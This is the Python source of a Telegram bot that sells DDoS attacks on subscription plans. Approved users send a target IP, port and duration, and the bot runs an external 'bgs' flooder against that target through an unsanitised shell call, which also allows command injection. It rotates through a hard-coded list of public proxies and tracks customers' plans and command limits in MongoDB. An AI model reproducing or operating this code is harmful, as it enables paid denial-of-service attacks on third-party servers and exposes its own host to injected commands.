from dotenv import load_dotenv
import os
import asyncio
import logging
import pymongo
import telebot
import random
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import time


# Load environment variables from .env file
load_dotenv()

# Get the token and MongoDB URI from environment variables
bot_token = os.getenv('BOT_TOKEN')
mongo_uri = os.getenv('MONGO_URI')
channel_id = os.getenv('CHANNEL_ID')
logging_id = os.getenv('LOGGING_ID')

if not bot_token:
    raise ValueError("Bot Token not found in the .env file.")
if not mongo_uri:
    raise ValueError("MongoDB URI not found in the .env file.")
if not channel_id:
    raise ValueError("Channel ID not found in the .env file.")
if not logging_id:
    raise ValueError("Logging ID not found in the .env file.")

print("Token, MongoDB URI and Channel ID loaded successfully\n\n\n")

# Check bgs file exist or not
if os.path.exists("./bgs"):
    print(f"BGS file exists. Running the rest of the function...\n\n\n")

    loop = asyncio.get_event_loop()
    
    # Logging things 
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

    # MongoDB connection
    client = pymongo.MongoClient(mongo_uri)
    # Database
    db = client['bgs']
    # Collection
    users_collection = db.users

    # BOt Tokken
    bot = telebot.TeleBot(bot_token)
    REQUEST_INTERVAL = 1

    # Blocked Ports which we don't use
    blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

    async def start_asyncio_thread():
        asyncio.set_event_loop(loop)
        await start_asyncio_loop()
    
    def update_proxy():
        proxy_list = [
            "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
            "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
            "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
            "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
            "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
            "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
            "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
            "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
            "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
            "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
            "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
            "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
            "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
            "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
            "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
            "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
            "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
            "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
            "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
            "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
            "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
            "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
            "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
            "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
            "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
            "https://80.78.23.49:1080"
        ]
        proxy = random.choice(proxy_list)
        telebot.apihelper.proxy = {'https': proxy}

    # Database access count increasment
    def increment_access_count(user_id):
        # Increments the access count for a given user.
        user_data = users_collection.find_one({"user_id": user_id})
        current_count = int(user_data.get('access_count', 0)) # Ensure access_count is an int
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"access_count": current_count + 1}}
        )

    def check_command_limit(user_data, chat_id):

        # Checks if the user has reached their command limit.
        # If they haven't, increments their access count and returns True.
        # If they have, sends a message indicating they've hit their limit and returns False.
    
        command_limit = int(user_data.get('command_limit', 10)) # Default limit is 10 if not set
        access_count = int(user_data.get('access_count', 0))
        if access_count >= command_limit:
            bot.send_message(chat_id, f"You have reached your command limit of {command_limit} commands.")
            return False

        increment_access_count(user_data['user_id'])
        return True
    
    # Command to update proxy
    @bot.message_handler(commands=['update_proxy'])
    def update_proxy_command(message):
        chat_id = message.chat.id
        try:
            update_proxy()
            bot.send_message(chat_id, "Proxy has been updated successfully.")
        except Exception as e:
            bot.send_message(chat_id, f"Failed to update proxy: {e}")

    async def start_asyncio_loop():
        while True:
            await asyncio.sleep(REQUEST_INTERVAL)

    # Attack Command using bgs file
    async def run_attack_command_async(target_ip, target_port, duration):
        process = await asyncio.create_subprocess_shell(f"./bgs {target_ip} {target_port} {duration} 10")
        await process.communicate()

    # Checks if a user is either an administrator or creator
    def is_user_admin(user_id, chat_id):
        try:
            return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
        except:
            return False
    
    # Admin commands to approve or disapprove anyone
    @bot.message_handler(commands=['approve', 'disapprove'])
    def approve_or_disapprove_user(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        is_admin = is_user_admin(user_id, channel_id)
        cmd_part = message.text.split()

        if not is_admin:
            bot.send_message(chat_id, "You are not *ADMIN*", parse_mode='Markdown')
            return
        if len(cmd_part) < 2:
            bot.send_message(chat_id, "Invalid command format. Use */approve <user_id> <plan> <days> <limts>* or */disapprove <user_id>.*", parse_mode='Markdown')
            return
        action = cmd_part[0]
        target_user_id = int(cmd_part[1])
        plan = int(cmd_part[2]) if len(cmd_part[3]) >= 3 else 0
        days = int(cmd_part[3]) if len(cmd_part[3]) >= 4 else 0
        limits = int(cmd_part[4]) if len(cmd_part[3]) >= 5 else 0

        if action == '/approve':
            if plan == 1: # Basic Plan
                if users_collection.count_documents({"plan": 1}) >= 99:
                    bot.send_message(chat_id, "*Approval failed: Basic Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                    return
            elif plan == 2:  # Basic+ Plan
                if users_collection.count_documents({"plan": 2}) >= 499:
                    bot.send_message(chat_id, "*Approval failed: Basic+ Plan ❤️ limit reached (499 users).*", parse_mode='Markdown')
                    return
            
            valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()

            users_collection.update_one(
                {"user_id": target_user_id},
                {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0, "command_limit": limits}},
                upsert=True
            )

            msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days with {limits} command limits.*"

        else:  # disapprove
            users_collection.update_one(
                {"user_id": target_user_id},
                {"$set": {"plan": 0, "valid_until": "", "access_count": 0, "command_limit": 0}},
                upsert=True
            )
            msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

        bot.send_message(chat_id, msg_text, parse_mode='Markdown') # Send message to current channel
        bot.send_message(channel_id, msg_text, parse_mode='Markdown') # Send message to logging channel `channel_id`

    # Attack command
    @bot.message_handler(commands=['Attack'])
    def attack_command(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        username = message.from_user.username

        try:
            user_data = users_collection.find_one({"user_id": user_id})

            # Check if the user has a valid plan and hasn't exceeded the command limit
            if not user_data or user_data['plan'] == 0:
                bot.send_message(chat_id, f"*@{username} you are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
                bot.send_message(logging_id, f"*@{username} you are not approved to use this bot.*", parse_mode='Markdown')
                return

            # Ensure the user's plan limit is not exceeded (for plan 1 and plan 2)
            if int(user_data['plan']) == 1 and users_collection.count_documents({"plan": 1}) > 99:
                bot.send_message(chat_id, "*Your Basic Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
                return
            if int(user_data['plan']) == 2 and users_collection.count_documents({"plan": 2}) > 499:
                bot.send_message(chat_id, "*Your Basic+ Plan ❤️ is currently not available due to limit reached.*", parse_mode='Markdown')
                return

            # Check command limit
            if not check_command_limit(user_data, chat_id):
                return  # The limit has been reached; no further actions are needed

            # Prompt the user to enter target details
            bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command)

        except Exception as e:
            logging.error(f"Error in attack command: {e}")

    def process_attack_command(message):
        username = message.from_user.username
        try:
            args = message.text.split()
            if len(args) != 3:
                bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
                return
            target_ip, target_port, duration = args[0], int(args[1]), args[2]
            if target_port in blocked_ports:
                bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
                return
            asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
            bot.send_message(message.chat.id, f"*🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒! 🚀\n\n⚔️Host: {target_ip}\n⚙️Port: {target_port}\n⏰Time: {duration}*", parse_mode='Markdown')
            bot.send_message(logging_id, f"*@{username} sent success attack! \n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Error in processing attack command: {e}")
    def start_asyncio_thread():
        asyncio.set_event_loop(loop)
        loop.run_until_complete(start_asyncio_loop())

    # Initialize commands to button
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        # Create a markup object
        markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
        # Create buttons
        btn1 = KeyboardButton("Basic Plan 🧡")
        btn2 = KeyboardButton("Basic+ Plan ❤️")
        btn3 = KeyboardButton("Canary Download")
        btn4 = KeyboardButton("My Account🏦")
        btn5 = KeyboardButton("Help❓")
        btn6 = KeyboardButton("Contact admin")
        # Add buttons to the markup
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

    @bot.message_handler(func=lambda message: True)
    def handle_message(message):
        if message.text == "Basic Plan 🧡":
            bot.reply_to(message, "*Basic Plan selected*", parse_mode='Markdown')
            attack_command(message)
        elif message.text == "Basic+ Plan ❤️":
            bot.reply_to(message, "*Basic+ Plan selected*", parse_mode='Markdown')
            attack_command(message)
        elif message.text == "Canary Download":
            bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/BGS_MODS/4381*", parse_mode='Markdown')
        elif message.text == "My Account🏦":
            user_id = message.from_user.id
            user_data = users_collection.find_one({"user_id": user_id})
            if user_data:
                username = message.from_user.username
                plan = user_data.get('plan', 'N/A')
                valid_until = user_data.get('valid_until', 'N/A')
                current_time = datetime.now().isoformat()
                response = (f"*User ID: {user_id}\nUsername: @{username}\n"
                            f"Plan: {plan}\n"
                            f"Valid Until: {valid_until}\n"
                            f"Used Commands: {user_data.get('access_count', 0)}\n"
                            f"Limts: {user_data.get('command_limit', 'N/A')}\n"
                            f"Current Time: {current_time}*")
            else:
                response = "*No account information found. Please contact the administrator.*"
            bot.reply_to(message, response, parse_mode='Markdown')
        elif message.text == "Help❓":
            bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
        elif message.text == "Contact admin":
            bot.reply_to(message, "*[Admin](https://t.me/cloud0662)*", parse_mode='MarkdownV2')
        else:
            bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
    if __name__ == "__main__":
        asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
        asyncio_thread.start()
        logging.info("Starting Codespace activity keeper and Telegram bot...")
        while True:
            try:
                bot.polling(none_stop=True)
            except Exception as e:
                logging.error(f"An error occurred while polling: {e}")
            logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
            time.sleep(REQUEST_INTERVAL)

# If not found that pase that was that
else:
    print(f"Error: BGS file not found.")
